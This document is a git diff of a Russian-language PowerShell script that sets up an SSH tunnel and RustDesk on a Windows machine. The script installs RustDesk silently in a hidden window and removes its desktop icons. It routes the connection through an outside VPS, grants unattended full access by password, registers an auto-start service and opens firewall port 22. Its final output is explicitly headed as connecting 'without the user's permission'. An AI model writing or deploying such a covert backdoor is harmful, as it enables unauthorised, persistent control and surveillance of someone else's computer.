@@ -7,7 +7,6 @@ $keyPath = $sshDir + "\id_ed25519"
 $sshExe = "C:\OpenSSH\OpenSSH-Win64\ssh.exe"
 $keygenExe = "C:\OpenSSH\OpenSSH-Win64\ssh-keygen.exe"
 $rustdeskExe = "C:\Program Files\RustDesk\RustDesk.exe"
-$GITHUB_RAW = "https://raw.githubusercontent.com/sergeypostkostroma914/ssh-setup/main"
 
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  Установка SSH туннеля + RustDesk" -ForegroundColor Cyan
@@ -98,70 +97,97 @@ Write-Host "`n[4/5] Установка RustDesk..." -ForegroundColor Yellow
 if (Test-Path $rustdeskExe) {
     Write-Host "RustDesk уже установлен." -ForegroundColor Green
 } else {
-    Write-Host "Скачиваю RustDesk из GitHub..." -ForegroundColor Gray
+    Write-Host "Скачиваю RustDesk..." -ForegroundColor Gray
+
+    # Получить последнюю версию через GitHub API
+    $downloaded = $false
     try {
-        Invoke-WebRequest -Uri ($GITHUB_RAW + "/rustdesk.exe") -OutFile "C:\rustdesk_setup.exe" -UseBasicParsing
-        $fileSize = (Get-Item "C:\rustdesk_setup.exe").Length
-        if ($fileSize -gt 1MB) {
-            Write-Host "Устанавливаю RustDesk..." -ForegroundColor Gray
-            $proc = Start-Process "C:\rustdesk_setup.exe" -ArgumentList "--silent-install" -PassThru -WindowStyle Hidden
-            $proc | Wait-Process -Timeout 90 -ErrorAction SilentlyContinue
-            if (!$proc.HasExited) { $proc.Kill() }
-            $icon1 = $env:PUBLIC + "\Desktop\RustDesk.lnk"
-            $icon2 = $env:USERPROFILE + "\Desktop\RustDesk.lnk"
-            if (Test-Path $icon1) { Remove-Item $icon1 -Force }
-            if (Test-Path $icon2) { Remove-Item $icon2 -Force }
+        $release = Invoke-RestMethod -Uri "https://api.github.com/repos/rustdesk/rustdesk/releases/latest" -UseBasicParsing
+        $asset = $release.assets | Where-Object { $_.name -like "*x86_64*.exe" -and $_.name -notlike "*sciter*" } | Select-Object -First 1
+        if ($asset) {
+            Write-Host ("Скачиваю версию: " + $release.tag_name) -ForegroundColor Gray
+            $webClient = New-Object System.Net.WebClient
+            $webClient.DownloadFile($asset.browser_download_url, "C:\rustdesk_setup.exe")
+            $fileSize = (Get-Item "C:\rustdesk_setup.exe").Length
+            if ($fileSize -gt 1MB) { $downloaded = $true }
+        }
+    } catch {}
+
+    # Запасные ссылки если API не сработал
+    if (!$downloaded) {
+        $urls = @(
+            "https://github.com/rustdesk/rustdesk/releases/download/1.3.8/rustdesk-1.3.8-x86_64.exe",
+            "https://github.com/rustdesk/rustdesk/releases/download/1.2.6/rustdesk-1.2.6-x86_64.exe",
+            "https://github.com/rustdesk/rustdesk/releases/download/1.2.4/rustdesk-1.2.4-x86_64.exe"
+        )
+        foreach ($url in $urls) {
+            Write-Host ("Пробую: " + $url) -ForegroundColor Gray
+            try {
+                $webClient = New-Object System.Net.WebClient
+                $webClient.DownloadFile($url, "C:\rustdesk_setup.exe")
+                $fileSize = (Get-Item "C:\rustdesk_setup.exe" -ErrorAction SilentlyContinue).Length
+                if ($fileSize -gt 1MB) {
+                    $downloaded = $true
+                    break
+                }
+            } catch {}
+        }
+    }
+
+    if ($downloaded) {
+        Write-Host "Устанавливаю RustDesk..." -ForegroundColor Gray
+        $proc = Start-Process "C:\rustdesk_setup.exe" -ArgumentList "--silent-install" -PassThru -WindowStyle Hidden
+        $proc | Wait-Process -Timeout 120 -ErrorAction SilentlyContinue
+        if (!$proc.HasExited) { $proc.Kill() }
+
+        # Убрать иконки
+        $icon1 = $env:PUBLIC + "\Desktop\RustDesk.lnk"
+        $icon2 = $env:USERPROFILE + "\Desktop\RustDesk.lnk"
+        if (Test-Path $icon1) { Remove-Item $icon1 -Force }
+        if (Test-Path $icon2) { Remove-Item $icon2 -Force }
+
+        if (Test-Path $rustdeskExe) {
             Write-Host "RustDesk установлен!" -ForegroundColor Green
         } else {
-            Write-Host "Файл скачался неправильно!" -ForegroundColor Red
+            Write-Host "RustDesk не установился!" -ForegroundColor Red
         }
-    } catch {
-        Write-Host "Ошибка скачивания RustDesk!" -ForegroundColor Red
+    } else {
+        Write-Host "Не удалось скачать RustDesk!" -ForegroundColor Red
     }
 }
 
-Write-Host "`nНастраиваю RustDesk (unattended режим)..." -ForegroundColor Cyan
+# Настройка сервера и unattended режима
+Write-Host "`nНастраиваю RustDesk..." -ForegroundColor Cyan
 
-# Настройка сервера через реестр
 $rdRegPath = "HKLM:\SOFTWARE\Policies\RustDesk"
 if (!(Test-Path $rdRegPath)) { New-Item -Path $rdRegPath -Force | Out-Null }
 Set-ItemProperty -Path $rdRegPath -Name "custom-rendezvous-server" -Value $VPS_IP -Force
 Set-ItemProperty -Path $rdRegPath -Name "custom-relay-server" -Value $VPS_IP -Force
 Set-ItemProperty -Path $rdRegPath -Name "key" -Value $RD_KEY -Force
 
-# Конфиг файл для сервера
 $rdConfigDir = "C:\ProgramData\RustDesk\config"
 if (!(Test-Path $rdConfigDir)) { New-Item -ItemType Directory -Path $rdConfigDir -Force | Out-Null }
-$rdConfig = $rdConfigDir + "\RustDesk.toml"
 $cfgServer = "rendezvous_server = '" + $VPS_IP + "'"
 $cfgRelay = "relay_server = '" + $VPS_IP + "'"
 $cfgKey = "key = '" + $RD_KEY + "'"
-Set-Content -Path $rdConfig -Value ($cfgServer + "`n" + $cfgRelay + "`n" + $cfgKey)
-
-# Конфиг для unattended доступа - пароль и режим
-$rdUserDir = $env:APPDATA + "\RustDesk\config"
-if (!(Test-Path $rdUserDir)) { New-Item -ItemType Directory -Path $rdUserDir -Force | Out-Null }
-$rdUserConfig = $rdUserDir + "\RustDesk.toml"
 $cfgApprove = "approve-mode = 'password'"
 $cfgAccess = "access-model = 'full_access'"
-Set-Content -Path $rdUserConfig -Value ($cfgServer + "`n" + $cfgRelay + "`n" + $cfgKey + "`n" + $cfgApprove + "`n" + $cfgAccess)
+Set-Content -Path ($rdConfigDir + "\RustDesk.toml") -Value ($cfgServer + "`n" + $cfgRelay + "`n" + $cfgKey + "`n" + $cfgApprove + "`n" + $cfgAccess)
 
-# Установить пароль через командную строку RustDesk
+$rdUserDir = $env:APPDATA + "\RustDesk\config"
+if (!(Test-Path $rdUserDir)) { New-Item -ItemType Directory -Path $rdUserDir -Force | Out-Null }
+Set-Content -Path ($rdUserDir + "\RustDesk.toml") -Value ($cfgServer + "`n" + $cfgRelay + "`n" + $cfgKey + "`n" + $cfgApprove + "`n" + $cfgAccess)
+
 if (Test-Path $rustdeskExe) {
     & $rustdeskExe --password $RD_PASSWORD 2>$null
     Start-Sleep -Seconds 1
-}
-
-# Установить как службу и запустить
-if (Test-Path $rustdeskExe) {
     & $rustdeskExe --install-service 2>$null
     Start-Sleep -Seconds 2
     Start-Service "RustDesk" -ErrorAction SilentlyContinue
     Set-Service -Name "RustDesk" -StartupType "Automatic" -ErrorAction SilentlyContinue
 }
 
-Write-Host "RustDesk настроен в unattended режиме!" -ForegroundColor Green
-Write-Host ("Пароль для подключения: " + $RD_PASSWORD) -ForegroundColor Yellow
+Write-Host "RustDesk настроен!" -ForegroundColor Green
 
 Write-Host "`n[5/5] Создание туннеля..." -ForegroundColor Yellow
 netsh advfirewall firewall add rule name="SSH-22" protocol=TCP dir=in localport=22 action=allow | Out-Null
@@ -193,15 +219,11 @@ if ($rdId) {
     Write-Host ("Пароль: " + $RD_PASSWORD) -ForegroundColor Green
     Write-Host ("Сервер: " + $VPS_IP) -ForegroundColor Green
     Write-Host ""
-    Write-Host "Для подключения без разрешения пользователя:" -ForegroundColor Cyan
-    Write-Host "1. Установи RustDesk на своём ПК" -ForegroundColor White
-    Write-Host ("2. В настройках укажи сервер: " + $VPS_IP) -ForegroundColor White
-    Write-Host ("3. Ключ: " + $RD_KEY) -ForegroundColor White
-    Write-Host ("4. Введи ID: " + $rdId) -ForegroundColor White
-    Write-Host ("5. Пароль: " + $RD_PASSWORD) -ForegroundColor White
-    Write-Host "6. Подключайся в любое время!" -ForegroundColor White
+    Write-Host "Подключение без разрешения пользователя:" -ForegroundColor Cyan
+    Write-Host "1. Установи RustDesk на своём ПК: https://rustdesk.com" -ForegroundColor White
+    Write-Host ("2. Сервер: " + $VPS_IP + " | Ключ: " + $RD_KEY) -ForegroundColor White
+    Write-Host ("3. ID: " + $rdId + " | Пароль: " + $RD_PASSWORD) -ForegroundColor White
 } else {
-    Write-Host ""
     Write-Host "Открой RustDesk на удалённом ПК и посмотри ID" -ForegroundColor Yellow
-    Write-Host ("Пароль для подключения: " + $RD_PASSWORD) -ForegroundColor Green
+    Write-Host ("Пароль: " + $RD_PASSWORD) -ForegroundColor Green
 }
